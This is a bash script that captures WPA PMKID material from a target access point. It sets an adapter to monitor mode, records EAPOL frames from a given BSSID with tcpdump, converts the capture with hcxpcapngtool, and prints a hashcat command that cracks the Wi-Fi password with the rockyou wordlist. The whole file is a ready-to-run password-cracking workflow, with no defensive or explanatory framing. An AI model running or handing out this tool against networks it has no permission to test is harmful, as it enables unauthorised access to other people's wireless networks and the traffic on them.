#!/bin/bash
# TRUE PASSIVE PMKID Capture - Uses tcpdump (listen only, no transmission)
# Usage: ./capture_pmkid.sh <BSSID> <CHANNEL> <SSID> [duration_in_seconds]

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./capture_pmkid.sh <BSSID> <CHANNEL> <SSID> [duration]"
    echo "Example: ./capture_pmkid.sh 30:68:93:AC:96:AD 6 hackme 60"
    exit 1
fi

BSSID=$1
CHANNEL=$2
SSID=$3
DURATION=${4:-60}
CAPTURE_DIR="/home/ov3rr1d3/wifi_arsenal/captures"
SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts"

# Sanitize SSID for filename
if [ -z "$SSID" ] || [ "$SSID" = "<hidden>" ]; then
    SSID="hidden"
fi
# Replace spaces and special chars with underscores
SAFE_SSID=$(echo "$SSID" | tr ' /:*?"<>|' '_')

# Generate timestamp in format: 01-19am_10-21-2025
TIME_PART=$(date +%I-%M%p | tr 'A-Z' 'a-z')
DATE_PART=$(date +%m-%d-%Y)
TIMESTAMP="${TIME_PART}_${DATE_PART}"

OUTPUT_PREFIX="$CAPTURE_DIR/AP=${SAFE_SSID}_$TIMESTAMP"

echo "[*] Targeting: $BSSID on channel $CHANNEL"
echo "[*] Duration: $DURATION seconds"
echo "[*] Mode: TRUE PASSIVE (tcpdump - listen only, zero transmission)"
echo "[*] Output: $OUTPUT_PREFIX"
echo ""

# Ensure alfa0 is in monitor mode on correct channel
echo "[*] Setting alfa0 to monitor mode on channel $CHANNEL..."
$SCRIPT_DIR/mode_manager.sh ensure alfa0 monitor

if [ $? -ne 0 ]; then
    echo "[-] Failed to set monitor mode"
    exit 1
fi

# Set channel
sudo iw dev alfa0 set channel $CHANNEL

# Use tcpdump for truly passive capture
# Only captures EAPOL frames (where PMKID lives) from target BSSID
# tcpdump never transmits - pure listener
echo "[*] Starting passive capture..."
sudo timeout $DURATION tcpdump -i alfa0 -w "${OUTPUT_PREFIX}.pcapng" \
    "ether host $BSSID and (ether proto 0x888e or type mgt subtype beacon)" \
    2>/dev/null

# Check if we got anything
if [ -f "${OUTPUT_PREFIX}.pcapng" ]; then
    SIZE=$(stat -c%s "${OUTPUT_PREFIX}.pcapng" 2>/dev/null)
    if [ "$SIZE" -gt 0 ]; then
        echo ""
        echo "[+] Capture complete: ${OUTPUT_PREFIX}.pcapng ($SIZE bytes)"
        echo "[*] Converting to hashcat format..."
        
        # Convert to hashcat format
        hcxpcapngtool -o "${OUTPUT_PREFIX}.hc22000" "${OUTPUT_PREFIX}.pcapng" 2>/dev/null
        
        if [ -f "${OUTPUT_PREFIX}.hc22000" ] && [ -s "${OUTPUT_PREFIX}.hc22000" ]; then
            echo "[+] Hash file ready: ${OUTPUT_PREFIX}.hc22000"
            echo ""
            echo "[*] To crack:"
            echo "    hashcat -m 22000 ${OUTPUT_PREFIX}.hc22000 /usr/share/wordlists/rockyou.txt"
        else
            echo "[-] No valid PMKID found in capture"
            echo "    Captured traffic but no PMKID present"
            echo "    Try again or use handshake capture instead"
        fi
    else
        echo "[-] Capture file is empty"
    fi
else
    echo "[-] Capture failed"
fi
